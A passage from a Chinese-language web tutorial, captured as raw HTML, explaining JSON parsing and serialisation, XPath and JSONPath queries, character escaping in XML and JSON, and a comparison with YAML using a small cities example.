style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-0312e7f5 " data-slate-type="paragraph" data-slate-object="block" data-key="2513"> 
<span data-slate-object="text" data-key="2514"><span data-slate-leaf="true" data-offset-key="2514:0" 
data-first-offset="true"><span data-slate-string="true">在早些时候的 ES 版本中，这个方法不支持，那么还可以使用 eval 
大法，效果是一样的：</span></span></span> </div> <div class="se-a7501776 se-771af9ed" data-slate-type="pre" 
data-slate-object="block" data-key="2515" data-code-language="javascript"> <div class="se-f05ca8ec 
se-350b22fa"> <span></span> </div> <div class="se-19459271"> <div class="se-42f040e8 se-e37e527b" 
data-code-line-number="1"></div> </div> <div class="se-d567fc11 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2516"> <span data-slate-object="text" 
data-key="2517"><span data-slate-leaf="true" data-offset-key="2517:0" data-first-offset="true"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2187850043" 
data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:1"><span data-slate-string="true"> obj = </span></span><span 
data-slate-leaf="true" data-offset-key="2517:2"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_8774416132" data-annotation-type="annotation"><span data-slate-string="true">eval</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:3"><span data-slate-string="true">(</span></span><span 
data-slate-leaf="true" data-offset-key="2517:4"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6725982683" data-annotation-type="annotation"><span data-slate-string="true">''(''</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:5"><span data-slate-string="true"> + text + </span></span><span 
data-slate-leaf="true" data-offset-key="2517:6"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8882411575" data-annotation-type="annotation"><span data-slate-string="true">'')''</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:7"><span data-slate-string="true">);</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-5d54dbc5 " data-slate-type="paragraph" data-slate-object="block" data-key="2518"> 
<span data-slate-object="text" data-key="2519"><span data-slate-leaf="true" data-offset-key="2519:0" 
data-first-offset="true"><span data-slate-string="true">不过，在现代浏览器中，如果 text 不是绝对安全的，就不要使用这样的方法，因为 
eval 可以执行任何恶意代码。</span></span></span> </div> <div class="se-afee7ba0 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2520"> <span data-slate-object="text" data-key="2521"><span 
data-slate-leaf="true" data-offset-key="2521:0" data-first-offset="true"><span data-slate-string="true">当然，我们也可以把 
JavaScript 对象转换回（序列化）JSON 文本：</span></span></span> </div> <div class="se-c47e80a2 se-134f2613" 
data-slate-type="pre" data-slate-object="block" data-key="2522" data-code-language="javascript"> 
<div class="se-ab3dac82 se-5fca0c83"> <span></span> </div> <div class="se-13f8df6c"> <div class="se-641ef65d 
se-861028e8" data-code-line-number="1"></div> </div> <div class="se-cf02ea90 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2523"> <span data-slate-object="text" 
data-key="2524"><span data-slate-leaf="true" data-offset-key="2524:0" data-first-offset="true"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5121575037" 
data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="2524:1"><span data-slate-string="true"> serializedText 
= </span></span><span data-slate-leaf="true" data-offset-key="2524:2"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_4509367757" data-annotation-type="annotation"><span 
data-slate-string="true">JSON</span></span></span><span data-slate-leaf="true" data-offset-key="2524:3"><span 
data-slate-string="true">.stringify(obj);</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-0fc07ad9 
" data-slate-type="paragraph" data-slate-object="block" data-key="2525"> <span data-slate-object="text" 
data-key="2526"><span data-slate-leaf="true" data-offset-key="2526:0" data-first-offset="true"><span 
data-slate-string="true">完成以后，先不要关闭控制台，下面还会用到。</span></span></span> </div> <h3 class="se-6399a787" 
data-slate-type="heading" data-slate-object="block" data-key="2527"><span data-slate-object="text" 
data-key="2528"><span data-slate-leaf="true" data-offset-key="2528:0" data-first-offset="true"><span 
data-slate-string="true">3. 路径表达式</span></span></span></h3> <div class="se-5dee419e " data-slate-type="paragraph" 
data-slate-object="block" data-key="2529"> <span data-slate-object="text" data-key="2530"><span 
data-slate-leaf="true" data-offset-key="2530:0" data-first-offset="true"><span data-slate-string="true">对于一段巨大的 
XML 或 JSON 文本，我们经常需要找出其中特定的一个或多个节点（tag）、内容（content）或者属性，二者都有相似的方法。</span></span></span> </div> 
<div class="se-eb112edb " data-slate-type="paragraph" data-slate-object="block" data-key="2531"> 
<span data-slate-object="text" data-key="2532"><span data-slate-leaf="true" data-offset-key="2532:0" 
data-first-offset="true"><span data-slate-string="true">对于 XML 来说，它就是 XPath，也是 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2533" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2534"><span data-slate-leaf="true" data-offset-key="2534:0" 
data-first-offset="true"><span data-slate-string="true">W3C 的标准</span></span></span></a><span 
data-slate-object="text" data-key="2535"><span data-slate-leaf="true" data-offset-key="2535:0" 
data-first-offset="true"><span data-slate-string="true">。现在我们来动手操作一下吧：</span></span></span> 
</div> <div class="se-0dbbb791 " data-slate-type="paragraph" data-slate-object="block" data-key="2536"> 
<span data-slate-object="text" data-key="2537"><span data-slate-leaf="true" data-offset-key="2537:0" 
data-first-offset="true"><span data-slate-string="true">我们可以利用 Xpath Generator 来直观地生成相应的 XPath。让我们打开</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2538" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2539"><span data-slate-leaf="true" data-offset-key="2539:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2540"><span data-slate-leaf="true" data-offset-key="2540:0" 
data-first-offset="true"><span data-slate-string="true">，找到我们刚才保存下来的 cities.xml 文件，拷贝里面的内容，粘贴到页面上。</span></span></span> 
</div> <div class="se-e6892ecd" data-slate-type="image" data-slate-object="block" data-key="2541"> 
<img class="se-a148a510" src="https://static001.geekbang.org/resource/image/36/98/3612154fb3c1fb8781c1e94388868798.png"> 
</div> <div class="se-81cc1e12 " data-slate-type="paragraph" data-slate-object="block" data-key="2542"> 
<span data-slate-object="text" data-key="2543"><span data-slate-leaf="true" data-offset-key="2543:0" 
data-first-offset="true"><span data-slate-string="true">接着，点击第一个 id 标签，你将看到这样的 XPath：</span></span></span> 
</div> <div class="se-3a5ca498 se-13f0fe02" data-slate-type="pre" data-slate-object="block" 
data-key="2544" data-code-language="objectivec"> <div class="se-0e1f95f4 se-de997c9f"> <span></span> 
</div> <div class="se-0e880380"> <div class="se-37356a56 se-bbc8a7d4" data-code-line-number="1"></div> 
</div> <div class="se-c0c37f4b ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2545"> <span data-slate-object="text" data-key="2546"><span 
data-slate-leaf="true" data-offset-key="2546:0" data-first-offset="true"><span data-slate-string="true">/cities/city[</span></span><span 
data-slate-leaf="true" data-offset-key="2546:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8083813922" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2546:2"><span data-slate-string="true">]/</span></span><span 
data-slate-leaf="true" data-offset-key="2546:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3163210251" data-annotation-type="annotation"><span data-slate-string="true">id</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-bf49d809 " data-slate-type="paragraph" data-slate-object="block" data-key="2547"> 
<span data-slate-object="text" data-key="2548"><span data-slate-leaf="true" data-offset-key="2548:0" 
data-first-offset="true"><span data-slate-string="true">这就唯一确定了 XML 中，cities 这个节点下，city 节点中的第一个，它下面的 
id 节点。</span></span></span> </div> <div class="se-4e36d07f " data-slate-type="paragraph" data-slate-object="block" 
data-key="2549"> <span data-slate-object="text" data-key="2550"><span data-slate-leaf="true" 
data-offset-key="2550:0" data-first-offset="true"><span data-slate-string="true">我们再来试一试，点击 
Shanghai 这个 content，你将看到：</span></span></span> </div> <div class="se-3ecc001f se-d0cac6e2" 
data-slate-type="pre" data-slate-object="block" data-key="2551"> <div class="se-51bbff9a se-d335c55d"> 
<span></span> </div> <div class="se-a3640d9d"> <div class="se-ba437450 se-2780cc0c" data-code-line-number="1"></div> 
</div> <div class="se-cf993b7d ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2552"> <span data-slate-object="text" data-key="2553"><span 
data-slate-leaf="true" data-offset-key="2553:0" data-first-offset="true"><span data-slate-string="true">/cities/city[2]/name/text()</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-ed92940a " data-slate-type="paragraph" data-slate-object="block" data-key="2554"> 
<span data-slate-object="text" data-key="2555"><span data-slate-leaf="true" data-offset-key="2555:0" 
data-first-offset="true"><span data-slate-string="true">对于 JSON 来说，也有 JSONPath 这样的东西，但是，我们却很少提及它，因为正如上文我提到的，它和 
JavaScript 极强的亲和力。我们在前端代码中已经不自觉地通过对象的点操作符，或是数组的下标操作符使用了，于是，JSONPath 在多数场景中就显得不那么重要了。</span></span></span> 
</div> <div class="se-8f31472a " data-slate-type="paragraph" data-slate-object="block" data-key="2556"> 
<span data-slate-object="text" data-key="2557"><span data-slate-leaf="true" data-offset-key="2557:0" 
data-first-offset="true"><span data-slate-string="true">举例来说，上面我给出的两个 XPath 例子，我们在将 cities.json 
反序列化成 JavaScript 对象以后，我们可以直接访问（你可以在前面实践的控制台上，继续键入）：</span></span></span> </div> <div class="se-00a283da 
se-33cfd03b" data-slate-type="pre" data-slate-object="block" data-key="2558"> <div class="se-4589cc9a 
se-a811fcf4"> <span></span> </div> <div class="se-5f98b782"> <div class="se-7630bf28 se-875735b2" 
data-code-line-number="1"></div> </div> <div class="se-8a497793 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2559"> <span data-slate-object="text" 
data-key="2560"><span data-slate-leaf="true" data-offset-key="2560:0" data-first-offset="true"><span 
data-slate-string="true">obj.cities[0].id</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-7e1a0a0b 
" data-slate-type="paragraph" data-slate-object="block" data-key="2561"> <span data-slate-object="text" 
data-key="2562"><span data-slate-leaf="true" data-offset-key="2562:0" data-first-offset="true"><span 
data-slate-string="true">以及：</span></span></span> </div> <div class="se-d3c5092c se-4c0d13c1" 
data-slate-type="pre" data-slate-object="block" data-key="2563" data-code-language="javascript"> 
<div class="se-cd4e15ff se-9663266b"> <span></span> </div> <div class="se-e1e5a911"> <div class="se-b51cddcd 
se-27d5e066" data-code-line-number="1"></div> </div> <div class="se-c2bdbf32 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2564"> <span data-slate-object="text" 
data-key="2565"><span data-slate-leaf="true" data-offset-key="2565:0" data-first-offset="true"><span 
data-slate-string="true">obj[</span></span><span data-slate-leaf="true" data-offset-key="2565:1"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_3093836823" 
data-annotation-type="annotation"><span data-slate-string="true">''cities''</span></span></span><span 
data-slate-leaf="true" data-offset-key="2565:2"><span data-slate-string="true">][</span></span><span 
data-slate-leaf="true" data-offset-key="2565:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9958624362" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2565:4"><span data-slate-string="true">].name</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-495f20ce " data-slate-type="paragraph" data-slate-object="block" data-key="2566"> 
<span data-slate-object="text" data-key="2567"><span data-slate-leaf="true" data-offset-key="2567:0" 
data-first-offset="true"><span data-slate-string="true">但是，还有很多场景，特别是对于 JSON 支持不像 JavaScript 
那么足够的场景，JSONPath 就有其用武之地了。和前面介绍的 XPath 查找的例子一样，你可以打开 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2568" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2569"><span data-slate-leaf="true" data-offset-key="2569:0" data-first-offset="true"><span 
data-slate-string="true">JSON Path Finder</span></span></span></a><span data-slate-object="text" 
data-key="2570"><span data-slate-leaf="true" data-offset-key="2570:0" data-first-offset="true"><span 
data-slate-string="true"> 页面，把之前 cities.json 的文本粘贴到左侧的输入框中，在右侧选择对应的节点或值，上方就会显示出 JSONPath 了：</span></span></span> 
</div> <div class="se-ea1aaadc" data-slate-type="image" data-slate-object="block" data-key="2571"> 
<img class="se-fbc41a0f" src="https://static001.geekbang.org/resource/image/33/11/33060ae88d70328e2d8c0ea24bd8af11.png"> 
</div> <div class="se-d1fd3aaa " data-slate-type="paragraph" data-slate-object="block" data-key="2572"> 
<span data-slate-object="text" data-key="2573"><span data-slate-leaf="true" data-offset-key="2573:0" 
data-first-offset="true"><span data-slate-string="true">所以，Beijing 的 id 和 Shanghai 的 name 分别显示为：</span></span></span> 
</div> <div class="se-516c76f6 se-cd4f6307" data-slate-type="pre" data-slate-object="block" 
data-key="2574"> <div class="se-dedc5fe2 se-3fda8213"> <span></span> </div> <div class="se-2791c879"> 
<div class="se-3bfe589c se-7b84898c" data-code-line-number="1"></div> <div class="se-3bfe589c 
se-7b84898c" data-code-line-number="2"></div> </div> <div class="se-5222d9cd ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2575"> <span data-slate-object="text" 
data-key="2576"><span data-slate-leaf="true" data-offset-key="2576:0" data-first-offset="true"><span 
data-slate-string="true">x.cities[0].id</span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2577"> <span data-slate-object="text" 
data-key="2578"><span data-slate-leaf="true" data-offset-key="2578:0" data-first-offset="true"><span 
data-slate-string="true">x.cities[1].name</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-6b5d25ef 
" data-slate-type="paragraph" data-slate-object="block" data-key="2579"> <span data-slate-object="text" 
data-key="2580"><span data-slate-leaf="true" data-offset-key="2580:0" data-first-offset="true"><span 
data-slate-string="true">这和 JavaScript 对象访问的表达式是一致的。</span></span></span> </div> <h3 class="se-fbb7bd9b" 
data-slate-type="heading" data-slate-object="block" data-key="2581"><span data-slate-object="text" 
data-key="2582"><span data-slate-leaf="true" data-offset-key="2582:0" data-first-offset="true"><span 
data-slate-string="true">4. 特殊字符</span></span></span></h3> <div class="se-2abb2140 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2583"> <span data-slate-object="text" data-key="2584"><span 
data-slate-leaf="true" data-offset-key="2584:0" data-first-offset="true"><span data-slate-string="true">任何格式都要使用特定的字符来表示结构和关系，那么 
XML 和 JSON 也不例外，这些特定字符，如果被用来表示实际内容，就会出现“冲突”，于是我们就需要转义。</span></span></span> </div> <div class="se-c8f9ad38 
" data-slate-type="paragraph" data-slate-object="block" data-key="2585"> <span data-slate-object="text" 
data-key="2586"><span data-slate-leaf="true" data-offset-key="2586:0" data-first-offset="true"><span 
data-slate-string="true">对于 XML 来说，且看下面的表格，第三列是“预定义实体”，也就是字符转义后相应的形式：</span></span></span> 
</div> <div class="se-2205c5bd" data-slate-type="image" data-slate-object="block" data-key="2587"> 
<img class="se-962a9136" src="https://static001.geekbang.org/resource/image/27/13/275ae26a648e6b40a577b73aa6bcee13.jpg"> 
</div> <div class="se-b1ae8a2d " data-slate-type="paragraph" data-slate-object="block" data-key="2588"> 
<span data-slate-object="text" data-key="2589"><span data-slate-leaf="true" data-offset-key="2589:0" 
data-first-offset="true"><span data-slate-string="true">值得一提的是，在 XML 中，我们还能够以 CDATA 来表示内容，这种方式可以尽可能地避免对于转义的使用，并可以直接使用换行等控制字符，增加 
XML 的可读性。比方说下面这个例子，实际的 function 使用 CDATA 的方式给嵌在了 function 这个 tag 内：</span></span></span> </div> 
<div class="se-c313d4fe se-58701fce" data-slate-type="pre" data-slate-object="block" data-key="2590" 
data-code-language="typescript"> <div class="se-d7dd8872 se-9f7a09c3"> <span></span> </div> 
<div class="se-0b99e7da"> <div class="se-a611e806 se-0272b86d" data-code-line-number="1"></div> 
<div class="se-a611e806 se-0272b86d" data-code-line-number="2"></div> <div class="se-a611e806 
se-0272b86d" data-code-line-number="3"></div> <div class="se-a611e806 se-0272b86d" data-code-line-number="4"></div> 
<div class="se-a611e806 se-0272b86d" data-code-line-number="5"></div> </div> <div class="se-47812690 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2591"> <span data-slate-object="text" data-key="2592"><span data-slate-leaf="true" 
data-offset-key="2592:0" data-first-offset="true"><span data-slate-string="true">&lt;</span></span><span 
data-slate-leaf="true" data-offset-key="2592:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2525850969" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5709729979" data-annotation-type="annotation"><span 
data-slate-string="true">function</span></span></span></span><span data-slate-leaf="true" data-offset-key="2592:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5709729979" 
data-annotation-type="annotation"><span data-slate-string="true">&gt;&lt;![</span></span></span><span 
data-slate-leaf="true" data-offset-key="2592:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5709729979" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6128541323" data-annotation-type="annotation"><span 
data-slate-string="true">CDATA</span></span></span></span><span data-slate-leaf="true" data-offset-key="2592:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5709729979" 
data-annotation-type="annotation"><span data-slate-string="true">[</span></span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2593"> <span data-slate-object="text" data-key="2594"><span data-slate-leaf="true" 
data-offset-key="2594:0" data-first-offset="true"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_6101738485" data-annotation-type="annotation"><span data-slate-string="true">function 
compare(a, b) </span></span></span><span data-slate-leaf="true" data-offset-key="2594:1"><span 
data-slate-string="true">{</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2595"> <span data-slate-object="text" 
data-key="2596"><span data-slate-leaf="true" data-offset-key="2596:0" data-first-offset="true"><span 
data-slate-string="true"> ...</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2597"> <span data-slate-object="text" 
data-key="2598"><span data-slate-leaf="true" data-offset-key="2598:0" data-first-offset="true"><span 
data-slate-string="true">}</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2599"> <span data-slate-object="text" 
data-key="2600"><span data-slate-leaf="true" data-offset-key="2600:0" data-first-offset="true"><span 
data-slate-string="true">]]&gt;&lt;/</span></span><span data-slate-leaf="true" data-offset-key="2600:1"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_9790350128" 
data-annotation-type="annotation"><span data-slate-string="true">function&gt;</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-be288bff " data-slate-type="paragraph" data-slate-object="block" data-key="2601"> 
<span data-slate-object="text" data-key="2602"><span data-slate-leaf="true" data-offset-key="2602:0" 
data-first-offset="true"><span data-slate-string="true">对于 JSON 来说，没有这样的预定义实体，但是我们也经常需要转义，比如说，如果双引号出现在了一对双引号内的字符串中，这时候我们可以用常规的反斜杠</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2603" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2604"><span data-slate-leaf="true" data-offset-key="2604:0" 
data-first-offset="true"><span data-slate-string="true">转义序列</span></span></span></a><span 
data-slate-object="text" data-key="2605"><span data-slate-leaf="true" data-offset-key="2605:0" 
data-first-offset="true"><span data-slate-string="true">来表示，比如引号“转义为 \”等。</span></span></span> 
</div> <h2 class="se-f63a0b4d" data-slate-type="heading" data-slate-object="block" data-key="2606"><span 
data-slate-object="text" data-key="2607"><span data-slate-leaf="true" data-offset-key="2607:0" 
data-first-offset="true"><span data-slate-string="true">审视一番 YAML</span></span></span></h2> 
<div class="se-3617011d " data-slate-type="paragraph" data-slate-object="block" data-key="2608"> 
<span data-slate-object="text" data-key="2609"><span data-slate-leaf="true" data-offset-key="2609:0" 
data-first-offset="true"><span data-slate-string="true">最后来讲一讲 YAML，这是一种可读性非常优秀的数据交换语言。如果你使用过 
Python，那么对于其“有意义”的缩进应该印象深刻，而 YAML，也具备这样的特点。你可以打开 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2610" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2611"><span data-slate-leaf="true" data-offset-key="2611:0" data-first-offset="true"><span 
data-slate-string="true">XML to YAML Converter</span></span></span></a><span data-slate-object="text" 
data-key="2612"><span data-slate-leaf="true" data-offset-key="2612:0" data-first-offset="true"><span 
data-slate-string="true"> 这个网站，然后将前面我们创建的 cities.xml 的内容拷贝出来，贴到左侧的输入框中：</span></span></span> 
</div> <div class="se-f44ee931" data-slate-type="image" data-slate-object="block" data-key="2613"> 
<img class="se-10327527" src="https://static001.geekbang.org/resource/image/3a/8d/3a4473188cfb646fe2f66e1311630e8d.png"> 
</div> <div class="se-9576bf5a " data-slate-type="paragraph" data-slate-object="block" data-key="2614"> 
<span data-slate-object="text" data-key="2615"><span data-slate-leaf="true" data-offset-key="2615:0" 
data-first-offset="true"><span data-slate-string="true">然后点击 XML TO YAML 按钮，你就能看到前面的例子，如果使用 
YAML 来表示，它会是这么个样子：</span></span></span> </div> <div class="se-ab0162a8 se-d2b3341d" data-slate-type="pre" 
data-slate-object="block" data-key="2616" data-code-language="objectivec"> <div class="se-e1ec1c2a 
se-68b47c83"> <span></span> </div> <div class="se-7a68ca9a"> <div class="se-be35eafb se-eaa4abea" 
data-code-line-number="1"></div> <div class="se-be35eafb se-eaa4abea" data-code-line-number="2"></div> 
<div class="se-be35eafb se-eaa4abea" data-code-line-number="3"></div> <div class="se-be35eafb 
se-eaa4abea" data-code-line-number="4"></div> <div class="se-be35eafb se-eaa4abea" data-code-line-number="5"></div> 
<div class="se-be35eafb se-eaa4abea" data-code-line-number="6"></div> <div class="se-be35eafb 
se-eaa4abea" data-code-line-number="7"></div> <div class="se-be35eafb se-eaa4abea" data-code-line-number="8"></div> 
</div> <div class="se-57089d6d ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2617"> <span data-slate-object="text" data-key="2618"><span 
data-slate-leaf="true" data-offset-key="2618:0" data-first-offset="true"><span data-slate-string="true">cities: 
</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2619"> <span data-slate-object="text" data-key="2620"><span 
data-slate-leaf="true" data-offset-key="2620:0" data-first-offset="true"><span data-slate-string="true"> 
city: </span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2621"> <span data-slate-object="text" data-key="2622"><span 
data-slate-leaf="true" data-offset-key="2622:0" data-first-offset="true"><span data-slate-string="true"> 
- </span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2623"> <span data-slate-object="text" data-key="2624"><span 
data-slate-leaf="true" data-offset-key="2624:0" data-first-offset="true"><span data-slate-string="true"> 
name: Beijing</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2625"> <span data-slate-object="text" data-key="2626"><span 
data-slate-leaf="true" data-offset-key="2626:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2626:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1326968000" data-annotation-type="annotation"><span 
data-slate-string="true">id</span></span></span><span data-slate-leaf="true" data-offset-key="2626:2"><span 
data-slate-string="true">: </span></span><span data-slate-leaf="true" data-offset-key="2626:3"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_1703801093" 
data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2627"> <span data-slate-object="text" data-key="2628"><span data-slate-leaf="true" 
data-offset-key="2628:0" data-first-offset="true"><span data-slate-string="true"> - </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2629"> <span data-slate-object="text" data-key="2630"><span data-slate-leaf="true" 
data-offset-key="2630:0" data-first-offset="true"><span data-slate-string="true"> name: Shanghai</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2631"> <span data-slate-object="text" data-key="2632"><span data-slate-leaf="true" 
data-offset-key="2632:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2632:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8242281315" data-annotation-type="annotation"><span data-slate-string="true">id</span></span></span><span 
data-slate-leaf="true" data-offset-key="2632:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2632:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6895277534" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-abcb3743 " data-slate-type="paragraph" data-slate-object="block" data-key="2633"> 
<span data-slate-object="text" data-key="2634"><span data-slate-leaf="true" data-offset-key="2634:0" 
data-first-offset="true"><span data-slate-string="true">你看，这种方式对于层次结构的表达，可以说比 XML 或 JSON 更为清晰。对于 
XML 和 JSON 的表达，对于每一层节点，你都要去找结尾标记，并和节点开头标记对应起来看；但是 YAML 则完全不用，它利用了人阅读的时候，一行一行往下顺序进行的特性，利用直观的缩进块来表达一个特定深度的节点。对于某些强调层次结构的特定信息表达的场景，比如说电子邮件消息，或者是商品信息、候选人的简历等等，使用 
YAML 比其它的数据交换格式都要直接和清晰。</span></span></span> </div> <div class="se-51d7d59f " data-slate-type="paragraph" 
data-slate-object="block" data-key="2635"> <span data-slate-object="text" data-key="2636"><span 
data-slate-leaf="true" data-offset-key="2636:0" data-first-offset="true"><span data-slate-string="true">值得注意的是，对于缩进，YAML 
要求不可以使用 TAB，只能使用空格，这和 Python 是不同的；而对于每层缩进多少个空格，这不重要，只要保证不同层次的缩进空格数量不同即可，这一点和 Python 是相同的。</span></span></span> 
